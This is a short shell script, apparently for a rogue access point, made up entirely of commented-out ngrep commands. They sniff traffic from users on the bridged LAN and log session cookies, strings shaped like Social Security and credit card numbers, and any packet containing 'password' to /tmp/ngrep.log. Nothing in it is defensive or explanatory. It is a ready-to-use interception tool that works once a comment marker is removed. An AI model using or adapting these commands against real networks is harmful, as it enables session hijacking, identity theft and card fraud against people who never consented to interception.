#!/bin/sh
# Capture Cookies
##ngrep -q -d br-lan -W byline -i 'Cookie:' dst host not 172.16.42.1 >> /tmp/ngrep.log
#ngrep -q -d br-lan -Wbyline -O /tmp/ngrep.pcap -i 'cookie:' tcp and port 80 and dst host not 172.16.42.1 >> /tmp/ngrep.log


# Capture Social Security Numbers
##ngrep -q -d br-lan -W single -w '[0-9]{3}\-[0-9]{2}\-[0-9]{4}' dst host not 172.16.42.1 >> /tmp/ngrep.log

# Capture Credit Card Numbers
# #ngrep -q -d br-lan -W single '[0-9]{4}\-[0-9]{4}\-[0-9]{4}\-[0-9]{4}' dst host not 172.16.42.1 >> /tmp/ngrep.log

# Capture Passwords
##ngrep -q -d br-lan -W single -i 'password' dst host not 172.16.42.1 >> /tmp/ngrep.log
